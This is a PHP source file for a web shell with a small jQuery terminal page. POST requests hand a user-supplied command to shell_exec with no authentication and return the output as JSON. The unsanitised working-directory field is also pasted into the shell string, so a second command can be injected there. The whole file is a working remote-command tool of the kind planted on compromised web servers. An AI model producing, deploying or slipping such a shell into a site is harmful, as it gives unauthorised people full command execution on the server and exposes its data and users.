<?php
if(isset($_POST['cmd'])){
  $user = trim(shell_exec('whoami'));
  $cwd = $_POST['cwd'];
  $time = trim(shell_exec('date \'+%X\''));

  $c = $_POST['cmd'];
  $output = trim(shell_exec("cd $cwd && ".$c.' 2>&1 && pwd || pwd'));

  $output = trim($output);
  $ncwd = substr($output, strrpos($output, "\n")+1);
  if($ncwd[0] != '/') //no idea why i need this
    $ncwd = '/'.$ncwd;

  $output = substr($output, 0, strrpos($output, "\n"));
  $opline = $time.' '.$user.'(cwd:'.$cwd.') $ '.$c;
//
  $response = array('opline' => $opline, 'output' => $output, 'cwd' => $ncwd);
  echo json_encode($response);
} else {
  $cwd = trim(shell_exec("pwd"));
  $resp = <<<EOD
<html>
    <head>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    </head>
    <body>
    <div id='history'></div>
    <form id="myForm">
        <input type="text" name="cmd" id="cmdt" autofocus="autofocus" />
        <input type="submit" name="click" value="button" />
        <input type="hidden" name="cwd" id="cwd" value="$cwd" />
    </form>
    <script>
    $(document).ready(function(){
      $("#myForm").submit(function(event){
        console.log($('#myForm').serialize());
        var command = $('#cmdt').val();
        var workdir = $('#cwd').val();
        $.ajax({
          type: "POST",
          url: "shell.php",
          data : {cmd: command, cwd: workdir},
          success: function(data){
            data = JSON.parse(data);
            $('#history').append('<pre>'+data['opline']+'</pre>');
            $('#history').append('<pre>'+data['output']+'</pre>');
            $('#cwd').val(data['cwd']);
            $('#cmdt').val("");
            $('html, body').animate({scrollTop: $("#cmdt").offset().top - document.body.clientHeight + $("#cmdt").height()}, 0);
          },
          error: function(xhr, desc, err){
            console.log(err);
          }
      });
        event.preventDefault();
      });
    });
    </script>
    </body>
</html>
EOD;
echo $resp;
}
?>

